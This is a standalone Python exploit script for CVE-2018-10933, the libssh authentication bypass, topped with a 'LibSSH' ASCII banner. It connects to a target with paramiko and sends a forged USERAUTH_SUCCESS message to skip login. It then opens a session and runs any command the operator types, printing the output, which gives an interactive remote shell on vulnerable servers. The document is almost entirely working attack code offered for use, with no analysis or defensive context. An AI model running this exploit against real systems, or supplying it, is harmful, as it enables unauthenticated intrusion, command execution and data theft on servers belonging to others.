#!/usr/bin/python3

import sys,getopt
import paramiko
import socket

print ("\033[1;31;48m");
print (" __        __  __         ______    ______   __    __  ")
print ("|  \      |  \|  \       /      \  /      \ |  \  |  \\")
print ("| $$       \$$| $$____  |  $$$$$$\|  $$$$$$\| $$  | $$ ")
print ("| $$      |  \| $$    \ | $$___\$$| $$___\$$| $$__| $$ ")
print ("| $$      | $$| $$$$$$$\ \$$    \  \$$    \ | $$    $$ ")
print ("| $$      | $$| $$  | $$ _\$$$$$$\ _\$$$$$$\| $$$$$$$$ ")
print ("| $$_____ | $$| $$__/ $$|  \__| $$|  \__| $$| $$  | $$ ")
print ("| $$     \| $$| $$    $$ \$$    $$ \$$    $$| $$  | $$ ")
print (" \$$$$$$$$ \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$ \n")
print("\033[3;37;40m")
print ("                     CVE-2018-10933 Remote Code Execution")

print("\033[0;37;48m\n")

def main(argv):
   server = ''
   port = ''
   try:
      opts, args = getopt.getopt(argv,"hs:p:",["iserver=","iport="])
   except getopt.GetoptError:
      print ('usage: python3 ssh.py -s [SERVER] -p [PORT] -c [COMMAND]')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print ('usage: python3 ssh.py -s [SERVER] -p [PORT] -c [COMMAND]')
         sys.exit()
      elif opt in ("-s", "--iserver"):
         server = arg
      elif opt in ("-p", "--iport"):
         port = arg
   if (not server or not port):
       print ("usage: python3 ssh.py -s [SERVER] -p [PORT]")
       sys.exit(1)
   print ("\n[*]Connecting to the target "+server+":"+port)
   try:
       s = socket.socket()
       s.connect((str(server),int(port))) #SSH PORT AS THE SECOND OPTION BY DEFAULT 1377 OR 22
       m = paramiko.message.Message()
       t = paramiko.transport.Transport(s)
       t.start_client()
       m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
       t._send_message(m)
       c = t.open_session()
       while True:
          command = input("Command "+server+":> ")
          c.exec_command(str(command))
          out = c.makefile("rb",2048)
          output = out.read()
          out.close()
          print(output)
   except paramiko.SSHException:
       print("Your target is not vulnerable or libssh is not present")
       sys.exit(1)
   except socket.error:
       print("Unable to connect. Try again.")
       sys.exit(1)
      
if __name__ == "__main__":
   main(sys.argv[1:])
